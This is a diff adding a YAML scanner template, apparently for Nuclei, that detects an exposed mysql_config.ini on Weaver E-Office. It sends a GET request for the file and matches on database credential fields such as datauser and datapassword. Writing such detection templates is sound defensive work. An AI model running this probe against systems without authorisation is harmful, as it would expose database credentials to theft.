@@ -1,0 +1,28 @@
+id: poc-yaml-weaver-e-office-mysql-config-ini-information-leak
+
+info:
+  name: Weaver E-Office mysql_config.ini Information Leak
+  author: ProjectDiscoveryAI
+  severity: medium
+  tags: sql-injection,info-leak,e-cology
+  description: |
+    This template detects the exposure of mysql_config.ini file in Weaver E-Office, which contains sensitive database information, including dataurl, datauser, datapassword, and dataname.
+
+http:
+  - raw:
+      - |
+        GET /mysql_config.ini HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "dataurl = \"localhost\""
+          - "datauser"
+          - "datapassword"
+          - "dataname = \"eoffice\""
